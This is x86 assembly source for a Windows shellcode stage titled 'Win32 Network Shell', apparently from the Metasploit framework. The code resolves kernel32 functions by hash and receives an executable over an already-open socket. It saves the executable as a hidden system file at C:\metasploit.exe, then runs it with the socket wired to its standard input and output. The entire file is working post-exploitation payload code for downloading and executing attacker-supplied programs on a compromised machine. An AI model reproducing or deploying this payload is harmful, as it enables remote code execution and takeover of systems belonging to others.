;      Title:  Win32 Network Shell
;  Platforms:  Windows NT 4.0, Windows 2000, Windows XP, Windows 2003
;     Author:  hdm[at]metasploit.com

[BITS 32]

%ifndef FN_RECV
    %define FN_RECV     [ebp + 24]
%endif

%define BLOCKSZ 32


; [ebp +  0] = kernel32.dll base
; [ebp +  4] = LGetProcAddress
; [ebp +  8] = LoadLibraryA
; edi        = socket


; ebx       = handle of temp file
; esi       = bytes left to read
; [ebp+100] = CreateFileA
; [ebp+104] = WriteFile
; [ebp+108] = CloseHandle
; [ebp+112] = file name
; [ebp+116] = recv buffer
; [ebp+120] = remaining bytes
; [ebp+124] = storage space

 
LLoadFileAPI:  
    push dword [ebp]
    push 0x7c0017a5         ; CreateFileA
    call [ebp + 4]
    mov [ebp+100], eax
    push dword [ebp]
    push 0xe80a791f         ; WriteFile
    call [ebp + 4]
    mov [ebp+104], eax    
    push dword [ebp]
    push 0x0ffd97fb         ; CloseHandle
    call [ebp + 4]
    mov [ebp+108], eax    

LReadFileLength: ; recv(s, buff, 4, 0)
    lea eax, [ebp+120]
    push byte 0x00          ; flags
    push 4                  ; length
    push eax                ; buffer
    push dword edi          ; socket
    call FN_RECV            ; recv()
    mov eax, [ebp+120]      ; remaining bytes
    
    call LGetFileName       ; get ptr to file name

; temporary file name
db "C:\metasploit.exe", 0x00

LGetFileName:
    pop ecx
    mov [ebp+112], ecx

LCreateFile:

    push byte 0     ; template
    push byte 6     ; FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM
    push byte 4     ; OPEN_ALWAYS
    push byte 0     ; lpSecurityAttributes=null
    push byte 7     ; FILE_SHARE_DELETE | FILE_SHARE_READ | FILE_SHARE_WRITE;
    push 0xe0000000 ; GENERIC_EXECUTE | GENERIC_READ | GENERIC_WRITE
    push ecx        ; file name
    call [ebp+100]
    mov ebx, eax     ; Handle in ebx

LConfigBuffer:
 ;   lea eax, [esp-BLOCKSZ-200] ; leave some room
    sub esp, BLOCKSZ - 200

;  shr eax, 2
;  shl eax, 2
    mov [ebp+116], esp  ; store it away
    
LReadSocket: ; recv(s, buff, 4096, 0)
    mov eax, [ebp+116]      ; recv buffer ptr
    push byte 0x00          ; flags
    push BLOCKSZ            ; length
    push eax                ; buffer
    push dword edi          ; socket
    call FN_RECV            ; recv()
    mov ecx, [ebp+120]      ; remaining bytes
    sub ecx, eax            ; subtract recv
    mov [ebp+120], ecx      ; put it back

LWriteFile:
    push esp                ; create storage
    mov ecx, esp            ; get storage space
    push byte 0             ; not overlapped
    push ecx                ; &written
    push eax                ; recv len
    push dword [ebp+116]    ; source buffer
    push ebx                ; file handle
    call [ebp+104]          ; WriteFile
    pop ecx                 ; remove storage

    mov eax, [ebp+120]      ; remaining bytes
    test eax, eax           ; are we at zero?
    jnz LReadSocket         ; go read some more

LCloseHandle:
    push ebx
    call [ebp+108]

LCreateProcessStructs:
    xchg edi, edx       ; save edi to edx
    xor eax,eax         ; overwrite with null
    lea edi, [esp-84]   ; struct sizes
    push byte 21        ; 21 * 4 = 84
    pop ecx             ; set counter
    
LBZero:
	rep stosd           ; overwrite with null
    xchg edi, edx       ; restore edi
    
LCreateStructs:
	sub esp, 84
    mov byte [esp + 16], 68	    ; si.cb = sizeof(si) 
	mov word [esp + 60], 0x0101 ; si.dwflags
    
	; socket handles 
	mov [esp + 16 + 56], edi
	mov [esp + 16 + 60], edi
	mov [esp + 16 + 64], edi

	lea eax, [esp + 16]	; si 
	push esp			; pi 
	push eax
	push ecx
	push ecx
	push ecx
    
    inc ecx
	push ecx
    dec ecx
    
	push ecx
	push ecx
	push dword [ebp+112]
	push ecx

LCreateProcessA:
    push dword [ebp] ; kernel32.dll
    push 0x16b3fe72  ; CreateProcessA
    call [ebp + 4]
    call eax
	mov esi, esp
    
LWaitForSingleObject:
    push dword [ebp] ; kernel32.dll
    push 0xce05d9ad  ; WaitForSingleObject
    call [ebp + 4]
    mov ebx, eax
    
    push 0xFFFFFFFF
    push dword [esi]
    call ebx
    
LDeathBecomesYou:
    push dword [ebp] ; kernel32.dll
    push 0x73e2d87e  ; ExitProcess
    call [ebp + 4]
    
    xor ebx, ebx
    push ebx
    call eax
